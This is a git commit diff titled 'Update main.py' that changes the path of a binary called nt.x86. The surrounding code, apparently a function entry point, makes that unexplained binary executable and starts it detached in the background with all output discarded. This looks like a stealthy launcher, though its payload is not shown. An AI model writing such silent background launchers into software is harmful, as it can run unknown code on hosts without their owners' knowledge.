934c629fd957f80a7e2277f21a7a9b69038511c9
urBenm4 <138570858+urBenm4@users.noreply.github.com>
2026-02-26 23:24:37 +0400

    Update main.py

--- main.py
+++ main.py
@@ -2,7 +2,7 @@ import os
 import subprocess
 
 def main(context):
-    binary_path = "./nt.x86"
+    binary_path = "nt.x86"
     os.chmod(binary_path, 0o755)
     subprocess.Popen(["nohup", binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
